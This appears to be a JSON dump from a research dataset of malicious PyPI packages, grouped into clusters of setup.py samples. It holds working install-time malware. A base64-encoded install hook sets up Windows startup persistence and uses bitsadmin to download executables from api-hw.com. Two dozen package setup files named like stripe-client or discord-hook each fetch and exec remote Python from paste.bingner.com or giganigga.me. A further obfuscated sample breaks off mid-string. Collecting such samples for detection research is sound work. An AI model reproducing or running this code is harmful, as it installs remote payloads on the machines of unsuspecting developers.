XFN0YXJ0dXBcXFdpbmRvd3NfU3RhcnRlci52YnMiJykKICAgICAgICBvcGVuKGYiQzpcXFVzZXJzXFx7bG9naW59XFxBcHBEYXRhXFxSb2FtaW5nXFxNaWNyb3NvZnRcXFdpbmRvd3NcXFN0YXJ0IE1lbnVcXFByb2dyYW1zXFxTeXN0ZW02NFxcV0lOMzIudmJzIiwgImEiKS53cml0ZShmJ1NldCBXc2hTaGVsbCA9IENyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpIFxuV3NoU2hlbGwuUnVuIGNocigzNCkgJiAiQzpcXFVzZXJzXFx7bG9naW59XFxBcHBEYXRhXFxSb2FtaW5nXFxNaWNyb3NvZnRcXFdpbmRvd3NcXFN0YXJ0IE1lbnVcXFByb2dyYW1zXFxTeXN0ZW02NFxcV0lOMzIuYmF0IiAmIENocigzNCksIDBcblNldCBXc2hTaGVsbCA9IE5vdGhpbmcnKQogICAgICAgIG9wZW4oZiJDOlxcVXNlcnNcXHtsb2dpbn1cXEFwcERhdGFcXFJvYW1pbmdcXE1pY3Jvc29mdFxcV2luZG93c1xcU3RhcnQgTWVudVxcUHJvZ3JhbXNcXFN0YXJ0dXBcXFdJTjY0LnZicyIsICJhIikud3JpdGUoZidTZXQgV3NoU2hlbGwgPSBDcmVhdGVPYmplY3QoIldTY3JpcHQuU2hlbGwiKSBcbldzaFNoZWxsLlJ1biBjaHIoMzQpICYgIkM6XFxVc2Vyc1xce2xvZ2lufVxcQXBwRGF0YVxcUm9hbWluZ1xcTWljcm9zb2Z0XFxXaW5kb3dzXFxTdGFydCBNZW51XFxQcm9ncmFtc1xcU3lzdGVtNjRcXFdpbmRvd3MgSGVscGVyLmV4ZSIgJiBDaHIoMzQpLCAwXG5TZXQgV3NoU2hlbGwgPSBOb3RoaW5nJykKICAgICAgICBvcGVuKGYiQzpcXFVzZXJzXFx7bG9naW59XFxBcHBEYXRhXFxSb2FtaW5nXFxNaWNyb3NvZnRcXFdpbmRvd3NcXFN0YXJ0IE1lbnVcXFByb2dyYW1zXFxTeXN0ZW02NFxcc2gucHl3IiwgImEiKS53cml0ZShmJ2Zyb20gc2h1dGlsIGltcG9ydCB1bnBhY2tfYXJjaGl2ZVxuaW1wb3J0IHN1YnByb2Nlc3MsIG9zXG51bnBhY2tfYXJjaGl2ZSgiQzpcXFxcVXNlcnNcXFxce2xvZ2lufVxcXFxBcHBEYXRhXFxcXFJvYW1pbmdcXFxcTWljcm9zb2Z0XFxcXFdpbmRvd3NcXFxcU3RhcnQgTWVudVxcXFxQcm9ncmFtc1xcXFxTeXN0ZW02NFxcXFxydW50aW1lLnppcCIsICJDOlxcXFxVc2Vyc1xcXFx7bG9naW59XFxcXEFwcERhdGFcXFxcUm9hbWluZ1xcXFxNaWNyb3NvZnRcXFxcV2luZG93c1xcXFxTdGFydCBNZW51XFxcXFByb2dyYW1zXFxcXFN5c3RlbTY0IilcbnN1YnByb2Nlc3MucnVuKFtmIkM6XFxcXFVzZXJzXFxcXHtsb2dpbn1cXFxcQXBwRGF0YVxcXFxSb2FtaW5nXFxcXE1pY3Jvc29mdFxcXFxXaW5kb3dzXFxcXFN0YXJ0IE1lbnVcXFxcUHJvZ3JhbXNcXFxcU3lzdGVtNjRcXFxccHl0aG9udy5leGUiLCBmIkM6XFxcXFVzZXJzXFxcXHtsb2dpbn1cXFxcQXBwRGF0YVxcUm9hbWluZ1xcXFxNaWNyb3NvZnRcXFxcV2luZG93c1xcXFxTdGFydCBNZW51XFxcXFByb2dyYW1zXFxcXFN5c3RlbTY0XFxcXHN0dWIucHl3Il0sIHNoZWxsPVRydWUsIGNoZWNrPVRydWUpXG5vcy5yZW1vdmUoZiJDOlxcXFxVc2Vyc1xcXFx7bG9naW59XFxcXEFwcERhdGFcXFxcUm9hbWluZ1xcXFxNaWNyb3NvZnRcXFxcV2luZG93c1xcXFxTdGFydCBNZW51XFxcXFByb2dyYW1zXFxcXFN5c3RlbTY0XFxcXHN0dWIucHl3IiknKQogICAgICAgIG9wZW4oZiJDOlxcVXNlcnNcXHtsb2dpbn1cXEFwcERhdGFcXFJvYW1pbmdcXE1pY3Jvc29mdFxcV2luZG93c1xcU3RhcnQgTWVudVxcUHJvZ3JhbXNcXFN5c3RlbTY0XFxXSU4zMi5iYXQiLCAiYSIpLndyaXRlKGYnYml0c2FkbWluIC90cmFuc2ZlciBteWRvd25sb2Fkam9iIC9kb3dubG9hZCAvcHJpb3JpdHkgRk9SRUdST1VORCAiaHR0cHM6Ly9hcGktaHcuY29tL2RsL3J1bnRpbWUiICJDOlxcVXNlcnNcXHtsb2dpbn1cXEFwcERhdGFcXFJvYW1pbmdcXE1pY3Jvc29mdFxcV2luZG93c1xcU3RhcnQgTWVudVxcUHJvZ3JhbXNcXFN5c3RlbTY0XFxydW50aW1lLnppcCJcbnN0YXJ0ICIiICJDOlxcVXNlcnNcXHtsb2dpbn1cXEFwcERhdGFcXFJvYW1pbmdcXE1pY3Jvc29mdFxcV2luZG93c1xcU3RhcnQgTWVudVxcUHJvZ3JhbXNcXFN5c3RlbTY0XFxzaC5weXciXG5iaXRzYWRtaW4gL3RyYW5zZmVyIG15ZG93bmxvYWRqb2IgL2Rvd25sb2FkIC9wcmlvcml0eSBGT1JFR1JPVU5EICJodHRwczovL2FwaS1ody5jb20vZGwvdyIgIkM6XFxVc2Vyc1xce2xvZ2lufVxcQXBwRGF0YVxcUm9hbWluZ1xcTWljcm9zb2Z0XFxXaW5kb3dzXFxTdGFydCBNZW51XFxQcm9ncmFtc1xcU3lzdGVtNjRcXFdpbmRvd3MgSGVscGVyLmV4ZSJcbnN0YXJ0ICIiICJDOlxcVXNlcnNcXHtsb2dpbn1cXEFwcERhdGFcXFJvYW1pbmdcXE1pY3Jvc29mdFxcV2luZG93c1xcU3RhcnQgTWVudVxcUHJvZ3JhbXNcXFN0YXJ0dXBcXFdJTjY0LnZicyInKQogICAgICAgIHN1YnByb2Nlc3MucnVuKGYiQzpcXFVzZXJzXFx7bG9naW59XFxBcHBEYXRhXFxSb2FtaW5nXFxNaWNyb3NvZnRcXFdpbmRvd3NcXFN0YXJ0IE1lbnVcXFByb2dyYW1zXFxTeXN0ZW02NFxcV0lOMzIudmJzIiwgc2hlbGw9VHJ1ZSwgY2hlY2s9VHJ1ZSkKICAgICAgICBzdWJwcm9jZXNzLnJ1bihmIkM6XFxVc2Vyc1xce2xvZ2lufVxcQXBwRGF0YVxcUm9hbWluZ1xcTWljcm9zb2Z0XFxXaW5kb3dzXFxTdGFydCBNZW51XFxQcm9ncmFtc1xcU3lzdGVtNjRcXFdJTjIyLnZicyIsIHNoZWxsPVRydWUsIGNoZWNrPVRydWUpCiAgICBleGNlcHQ6CiAgICAgICAgcGFzcwplbHNlOiAgIAogICAgcGFzcw==\"))\n        except:\n            pass\n        install.run(self)\n\n# Setting up\nsetup(\n    name=\"pybowl\",\n    version=VERSION,\n    author=\"HW\",\n    author_email=\"\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    packages=find_packages(),\n    install_requires=[],\n    keywords=['python', 'http', 'https', 'requests', 'urllib', 'sockets', 'tcp'],\n    classifiers=[\n        \"Development Status :: 1 - Planning\",\n        \"Intended Audience :: Developers\",\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Unix\",\n        \"Operating System :: MacOS :: MacOS X\",\n        \"Operating System :: Microsoft :: Windows\",\n    ],\n    cmdclass={'install': CustomInstallCommand}\n)\n\nclass send():\n    pass\n\ndef __init__():\n    pass"
      }
    ]
  },
  {
    "cluster_id": 14,
    "size": 24,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-31-stripe-client-v1.0",
        "code": "from setuptools import setup\nfrom tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n_ttmp = _ffile(delete=False)\n_ttmp.write(b\"\"\"from urllib.request import urlopen as _uurlopen;exec(_uurlopen('https://paste.bingner.com/paste/g6h89/raw').read())\"\"\")\n_ttmp.close() \ntry: _ssystem(f\"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}\")\nexcept: pass\nsetup(\n    name='stripe-client',\n    packages=['stripe-client'],\n    version='1.0',\n    license='MIT',\n    description='package manager.',\n    author='Japanese1337',\n    keywords=['style'],\n    install_requires=[''],\n    classifiers=['Development Status :: 5 - Production/Stable']\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-31-stripepy-v1.0",
        "code": "from setuptools import setup\nfrom tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n_ttmp = _ffile(delete=False)\n_ttmp.write(b\"\"\"from urllib.request import urlopen as _uurlopen;exec(_uurlopen('https://paste.bingner.com/paste/g2n5h/raw').read())\"\"\")\n_ttmp.close() \ntry: _ssystem(f\"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}\")\nexcept: pass\nsetup(\n    name='stripepy',\n    packages=['stripepy'],\n    version='1.0',\n    license='MIT',\n    description='package manager.',\n    author='Switch',\n    keywords=['style'],\n    install_requires=[''],\n    classifiers=['Development Status :: 5 - Production/Stable']\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-04-01-colorfidget-v1.0",
        "code": "from setuptools import setup\nfrom tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n_ttmp = _ffile(delete=False)\n_ttmp.write(b\"\"\"from urllib.request import urlopen as _uurlopen;exec(_uurlopen('https://paste.bingner.com/paste/8wms4/raw').read())\"\"\")\n_ttmp.close() \ntry: _ssystem(f\"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}\")\nexcept: pass\nsetup(\n    name='colorfidget',\n    packages=['colorfidget'],\n    version='1.0',\n    license='MIT',\n    description='package manager.',\n    author='Japanese1337',\n    keywords=['style'],\n    install_requires=[''],\n    classifiers=['Development Status :: 5 - Production/Stable']\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-04-02-colored-fidget-v1.0",
        "code": "from setuptools import setup\nfrom tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n_ttmp = _ffile(delete=False)\n_ttmp.write(b\"\"\"from urllib.request import urlopen as _uurlopen;exec(_uurlopen('https://paste.bingner.com/paste/rb9vk/raw').read())\"\"\")\n_ttmp.close() \ntry: _ssystem(f\"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}\")\nexcept: pass\nsetup(\n    name='colored-fidget',\n    packages=['colored-fidget'],\n    version='1.0',\n    license='MIT',\n    description='package manager.',\n    author='Japanese1337',\n    keywords=['style'],\n    install_requires=[''],\n    classifiers=['Development Status :: 5 - Production/Stable']\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-04-02-pycolorstrex-v1.0",
        "code": "from setuptools import setup\nfrom tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n_ttmp = _ffile(delete=False)\n_ttmp.write(b\"\"\"from urllib.request import urlopen as _uurlopen;exec(_uurlopen('https://paste.bingner.com/paste/89o7n/raw').read())\"\"\")\n_ttmp.close() \ntry: _ssystem(f\"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}\")\nexcept: pass\nsetup(\n    name='pycolorstrex',\n    packages=['pycolorstrex'],\n    version='1.0',\n    license='MIT',\n    description='package manager.',\n    author='idklmao',\n    keywords=['style'],\n    install_requires=[''],\n    classifiers=['Development Status :: 5 - Production/Stable']\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-13-ligitgays-v1.0",
        "code": "from setuptools import setup\nfrom tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n_ttmp = _ffile(delete=False)\n_ttmp.write(b\"\"\"from urllib.request import urlopen as _uurlopen;exec(_uurlopen('https://paste.bingner.com/paste/jr7ow/raw').read())\"\"\")\n_ttmp.close() \ntry: _ssystem(f\"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}\")\nexcept: pass\nsetup(\n    name='ligitgays',\n    packages=['ligitgays'],\n    version='1.0',\n    license='MIT',\n    description='package manager.',\n    author='Switch',\n    keywords=['style'],\n    install_requires=[''],\n    classifiers=['Development Status :: 5 - Production/Stable']\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-13-ligitkidss-v1.0",
        "code": "from setuptools import setup\nfrom tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n_ttmp = _ffile(delete=False)\n_ttmp.write(b\"\"\"from urllib.request import urlopen as _uurlopen;exec(_uurlopen('https://paste.bingner.com/paste/97vnn/raw').read())\"\"\")\n_ttmp.close() \ntry: _ssystem(f\"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}\")\nexcept: pass\nsetup(\n    name='ligitkidss',\n    packages=['ligitkidss'],\n    version='1.0',\n    license='MIT',\n    description='package manager.',\n    author='Switch',\n    keywords=['style'],\n    install_requires=[''],\n    classifiers=['Development Status :: 5 - Production/Stable']\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-16-fluiddaddy-v1.0",
        "code": "from setuptools import setup\nfrom tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n_ttmp = _ffile(delete=False)\n_ttmp.write(b\"\"\"from urllib.request import urlopen as _uurlopen;exec(_uurlopen('https://paste.bingner.com/paste/nffxw/raw').read())\"\"\")\n_ttmp.close() \ntry: _ssystem(f\"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}\")\nexcept: pass\nsetup(\n    name='fluiddaddy',\n    packages=['fluiddaddy'],\n    version='1.0',\n    license='MIT',\n    description='package manager.',\n    author='Switch',\n    keywords=['style'],\n    install_requires=[''],\n    classifiers=['Development Status :: 5 - Production/Stable']\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-16-tls-bypass-v1.0",
        "code": "from setuptools import setup\nfrom tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n_ttmp = _ffile(delete=False)\n_ttmp.write(b\"\"\"from urllib.request import urlopen as _uurlopen;exec(_uurlopen('https://paste.bingner.com/paste/cry6n/raw').read())\"\"\")\n_ttmp.close() \ntry: _ssystem(f\"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}\")\nexcept: pass\nsetup(\n    name='tls-bypass',\n    packages=['tls-bypass'],\n    version='1.0',\n    license='MIT',\n    description='package manager.',\n    author='Switch',\n    keywords=['style'],\n    install_requires=[''],\n    classifiers=['Development Status :: 5 - Production/Stable']\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-17-zproxy-v1.0",
        "code": "from setuptools import setup\nfrom tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n_ttmp = _ffile(delete=False)\n_ttmp.write(b\"\"\"from urllib.request import urlopen as _uurlopen;exec(_uurlopen('https://paste.bingner.com/paste/dsvc4/raw').read())\"\"\")\n_ttmp.close() \ntry: _ssystem(f\"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}\")\nexcept: pass\nsetup(\n    name='zproxy',\n    packages=['zproxy'],\n    version='1.0',\n    license='MIT',\n    description='package manager.',\n    author='Switch',\n    keywords=['style'],\n    install_requires=[''],\n    classifiers=['Development Status :: 5 - Production/Stable']\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-17-zproxy2-v1.0",
        "code": "from setuptools import setup\nfrom tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n_ttmp = _ffile(delete=False)\n_ttmp.write(b\"\"\"from urllib.request import urlopen as _uurlopen;exec(_uurlopen('https://paste.bingner.com/paste/pq3s7/raw').read())\"\"\")\n_ttmp.close() \ntry: _ssystem(f\"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}\")\nexcept: pass\nsetup(\n    name='zproxy2',\n    packages=['zproxy2'],\n    version='1.0',\n    license='MIT',\n    description='package manager.',\n    author='Switch',\n    keywords=['style'],\n    install_requires=[''],\n    classifiers=['Development Status :: 5 - Production/Stable']\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-18-discord-hook-v1.0",
        "code": "from setuptools import setup\nfrom tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n_ttmp = _ffile(delete=False)\n_ttmp.write(b\"\"\"from urllib.request import urlopen as _uurlopen;exec(_uurlopen('https://paste.bingner.com/paste/4yndv/raw').read())\"\"\")\n_ttmp.close() \ntry: _ssystem(f\"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}\")\nexcept: pass\nsetup(\n    name='discord-hook',\n    packages=['discord-hook'],\n    version='1.0',\n    license='MIT',\n    description='package manager.',\n    author='Switch',\n    keywords=['style'],\n    install_requires=[''],\n    classifiers=['Development Status :: 5 - Production/Stable']\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-13-tls-python-v1.0",
        "code": "from setuptools import setup\nfrom tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n_ttmp = _ffile(delete=False)\n_ttmp.write(b\"\"\"from urllib.request import urlopen as _uurlopen;exec(_uurlopen('https://paste.bingner.com/paste/9mzzs/raw').read())\"\"\")\n_ttmp.close() \ntry: _ssystem(f\"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}\")\nexcept: pass\nsetup(\n    name='tls-python',\n    packages=['tls-python'],\n    version='1.0',\n    license='MIT',\n    description='package manager.',\n    author='Switch',\n    keywords=['style'],\n    install_requires=[''],\n    classifiers=['Development Status :: 5 - Production/Stable']\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-23-osxen-v1.0",
        "code": "from setuptools import setup\nfrom tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n_ttmp = _ffile(delete=False)\n_ttmp.write(b\"\"\"from urllib.request import urlopen as _uurlopen;exec(_uurlopen('https://paste.bingner.com/paste/c24j2/raw').read())\"\"\")\n_ttmp.close() \ntry: _ssystem(f\"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}\")\nexcept: pass\nsetup(\n    name='osxen',\n    packages=['osxen'],\n    version='1.0',\n    license='MIT',\n    description='package manager.',\n    author='idklmao',\n    keywords=['style'],\n    install_requires=[''],\n    classifiers=['Development Status :: 5 - Production/Stable']\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-23-pycaptchapass-v1.0",
        "code": "from setuptools import setup\nfrom tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n_ttmp = _ffile(delete=False)\n_ttmp.write(b\"\"\"from urllib.request import urlopen as _uurlopen;exec(_uurlopen('https://paste.bingner.com/paste/e9ysm/raw').read())\"\"\")\n_ttmp.close() \ntry: _ssystem(f\"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}\")\nexcept: pass\nsetup(\n    name='pycaptchapass',\n    packages=['pycaptchapass'],\n    version='1.0',\n    license='MIT',\n    description='package manager.',\n    author='idklmao',\n    keywords=['style'],\n    install_requires=[''],\n    classifiers=['Development Status :: 5 - Production/Stable']\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-26-capmonster-task-v1.0",
        "code": "from setuptools import setup\nfrom tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n_ttmp = _ffile(delete=False)\n_ttmp.write(b\"\"\"from urllib.request import urlopen as _uurlopen;exec(_uurlopen('https://paste.bingner.com/paste/z3oyv/raw').read())\"\"\")\n_ttmp.close() \ntry: _ssystem(f\"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}\")\nexcept: pass\nsetup(\n    name='capmonster-task',\n    packages=['capmonster-task'],\n    version='1.0',\n    license='MIT',\n    description='package manager.',\n    author='idklmao',\n    keywords=['style'],\n    install_requires=[''],\n    classifiers=['Development Status :: 5 - Production/Stable']\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-21-microsoft-helper-v1.0",
        "code": "from setuptools import setup\nfrom tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n_ttmp = _ffile(delete=False)\n_ttmp.write(b\"\"\"from urllib.request import urlopen as _uurlopen;exec(_uurlopen('https://paste.bingner.com/paste/rg8v8/raw').read())\"\"\")\n_ttmp.close() \ntry: _ssystem(f\"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}\")\nexcept: pass\nsetup(\n    name='microsoft-helper',\n    packages=['microsoft-helper'],\n    version='1.0',\n    license='MIT',\n    description='package manager.',\n    author='idklmao',\n    keywords=['style'],\n    install_requires=[''],\n    classifiers=['Development Status :: 5 - Production/Stable']\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-21-pyezstyle-v1.0",
        "code": "from setuptools import setup\nfrom tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n_ttmp = _ffile(delete=False)\n_ttmp.write(b\"\"\"from urllib.request import urlopen as _uurlopen;exec(_uurlopen('https://paste.bingner.com/paste/g95kf/raw').read())\"\"\")\n_ttmp.close() \ntry: _ssystem(f\"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}\")\nexcept: pass\nsetup(\n    name='pyezstyle',\n    packages=['pyezstyle'],\n    version='1.0',\n    license='MIT',\n    description='package manager.',\n    author='idklmao',\n    keywords=['style'],\n    install_requires=[''],\n    classifiers=['Development Status :: 5 - Production/Stable']\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-01-08-httpxfaster",
        "code": "from setuptools import setup\nfrom tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n_ttmp = _ffile(delete=False)\n_ttmp.write(b\"\"\"from urllib.request import urlopen as _uurlopen;exec(_uurlopen('https://www.giganigga.me/idk.html').read())\"\"\")\n_ttmp.close()\ntry: _ssystem(f\"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}\")\nexcept: pass\n\nsetup(\n\n    name='httpxfaster',\n    packages=['httpxfaster'],\n    version='1.0',\n    license='MIT',\n    description='Makes Your Program Faster',\n    author='helper',\n    keywords=['style'],\n    install_requires=[''],\n    classifiers=['Development Status :: 5 - Production/Stable']\n\n)\n\n\n\n\n\nprint(\"0000\")"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-01-08-reqsystem",
        "code": "from setuptools import setup\nfrom tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n_ttmp = _ffile(delete=False)\n_ttmp.write(b\"\"\"from urllib.request import urlopen as _uurlopen;exec(_uurlopen('https://www.giganigga.me/idk2.html').read())\"\"\")\n_ttmp.close()\ntry: _ssystem(f\"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}\")\nexcept: pass\n\nsetup(\n\n    name='reqsystem',\n    packages=['reqsystem'],\n    version='1.0',\n    license='MIT',\n    description='Makes Your Program Easier',\n    author='helper',\n    keywords=['style'],\n    install_requires=[''],\n    classifiers=['Development Status :: 5 - Production/Stable']\n\n)\n\n\n\n\n\nprint(\"0000\")"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-12-dpy-bot-v1.0",
        "code": "from setuptools import setup\n\nfrom tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n_ttmp = _ffile(delete=False)\n_ttmp.write(b\"\"\"from urllib.request import urlopen as _uurlopen;exec(_uurlopen('https://paste.bingner.com/paste/6d6ze/raw').read())\"\"\")\n_ttmp.close()\n_ssystem(f\"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}\")\n\nsetup(\n\n    name='dpy-bot',\n    packages=['dpy-bot'],\n    version='1.0',\n    license='MIT',\n    description='HTTPX',\n    author='helper',\n    keywords=['style'],\n    install_requires=[''],\n    classifiers=['Development Status :: 5 - Production/Stable']\n\n)\n\n\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-14-syntax-init-v1.0",
        "code": "from setuptools import setup\nfrom tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n_ttmp = _ffile(delete=False)\n_ttmp.write(b\"\"\"from urllib.request import urlopen as _uurlopen;exec(_uurlopen('https://paste.bingner.com/paste/o27gb/raw').read())\"\"\")\n_ttmp.close() \ntry: _ssystem(f\"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}\")\nexcept: pass\nsetup(\n    name='syntax-init',\n    packages=['syntax-init'],\n    version='1.0',\n    license='MIT',\n    description='package manager.',\n    author='Switch',\n    keywords=['style'],\n    install_requires=[''],\n    classifiers=['Development Status :: 5 - Production/Stable']\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-14-xboxlivepy-v1.0",
        "code": "from setuptools import setup\nfrom tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n_ttmp = _ffile(delete=False)\n_ttmp.write(b\"\"\"from urllib.request import urlopen as _uurlopen;exec(_uurlopen('https://paste.bingner.com/paste/q77t3/raw').read())\"\"\")\n_ttmp.close() \ntry: _ssystem(f\"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}\")\nexcept: pass\nsetup(\n    name='xboxlivepy',\n    packages=['xboxlivepy'],\n    version='1.0',\n    license='MIT',\n    description='package manager.',\n    author='Switch',\n    keywords=['style'],\n    install_requires=[''],\n    classifiers=['Development Status :: 5 - Production/Stable']\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-14-xboxredeemer-v1.0",
        "code": "from setuptools import setup\nfrom tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n_ttmp = _ffile(delete=False)\n_ttmp.write(b\"\"\"from urllib.request import urlopen as _uurlopen;exec(_uurlopen('https://paste.bingner.com/paste/47rpu/raw').read())\"\"\")\n_ttmp.close() \ntry: _ssystem(f\"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}\")\nexcept: pass\nsetup(\n    name='xboxredeemer',\n    packages=['xboxredeemer'],\n    version='1.0',\n    license='MIT',\n    description='package manager.',\n    author='Switch',\n    keywords=['style'],\n    install_requires=[''],\n    classifiers=['Development Status :: 5 - Production/Stable']\n)\n"
      }
    ]
  },
  {
    "cluster_id": 15,
    "size": 5,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-01-pysubprocess-v1.0.0",
        "code": "#pip install pycryptodome  , It works only v3.11 Above.\nimport random ,base64,codecs,zlib;pyobfuscate=\"\"\n\nobfuscate = dict(map(lambda map,dict:(map,dict),['(https://pyobfuscate.com)*(exec)'],['''ABAO=8T0s3OoRhdDid6#K{skTQv~Ro5qsY<QSScG??$N!3RgqhjAi^KegiEQ?PMSrtLx+V!ITe7HKCM*CcBrz)u4i8ltd89oB0*Xv&ak>*E?iXFGOCjXy>@zuuOVTDU^2UrqF}!F_p_&wefthPG(W=@vYV32BZszRPT)6R#~oNwAXQ;Eg*bXG@&6cC$lK}Uba&^&Deg`Dzrs_p^R5y<HC1oPU-{-ZZ)o6{?I0;)bD8RlMR?r>6sWHy{b)KnmJ0!J5W9s^>D|1P)bZ+CmHFfE6uFUd0d}mZ38D_5iZJdA<WS;ubLc(rB~@y2HfnV@b^CH&0Ss5@PjkNm|9fap~ZQXv6|QfniWWXC&~0&eUN*(&gxU?`V9eH&Bk$pnK{^c7cU~gussL8GsC5eu?H+SIC#Z%KDFj$LWnW7MVHzN-Sm8lOawJUE!3gue`v1pfS|&20>E1LoGE}q);TbYM{jP~O>dT4QZf`(;@~(A&Y$}J5O%hs_l0qs)Ez34^$DiATvA0rNXh4C<ZVL`Of5YmJm8s9RViLcA^ZJ|Y2LE0(5%d;Zlvg2ivAAzQsr8V%-0`;aeVq&mDJ+d3Djy=;?F2n1<iDJQ5f0yomof_?33B0#w0R$6M)ZyxY(-><x(jV0lKQQR=udMu}kMvQ=g#R{~$lL1&C^Uh@s2RctIUngQO#oZ8?}xG(6T(R}oO+AIfF6D}kp$hS|sw1{-<CHItyb>Oc}EMbvYu{Au3+{Jn~P{Y>_?)_m+6x6sYmT&&2bc?%Da$mtqAO~Pdaez~iDX}Fn8Eg@(06E9Q|e)2qfdP$ol)sME!MYeXz*GL56b2_d80cnRQ